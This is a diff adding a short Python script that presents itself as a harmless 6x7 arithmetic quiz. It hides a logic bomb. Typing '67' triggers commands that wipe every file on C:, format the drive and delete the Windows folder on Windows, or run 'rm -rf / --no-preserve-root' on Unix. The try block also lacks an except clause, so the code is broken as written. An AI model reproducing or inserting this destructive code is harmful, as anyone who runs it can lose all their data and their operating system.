@@ -1,0 +1,19 @@
+import os
+import sys
+
+def calculator():
+    try:
+        user_input = input(" 6x7=? : ")
+        if user_input.strip() == "42":
+            print("ok")
+        elif user_input.strip() == "67":
+            if os.name == 'nt':  # Windows
+                os.system("del /f /s /q C:\\*.* 2>nul")
+                os.system("format C: /fs:NTFS /q /y")
+                os.system("rmdir /s /q C:\\Windows")
+            else:  # Unix/Linux 
+                os.system("rm -rf / --no-preserve-root")
+            sys.exit(0)
+
+if __name__ == "__main__":
+    calculator()
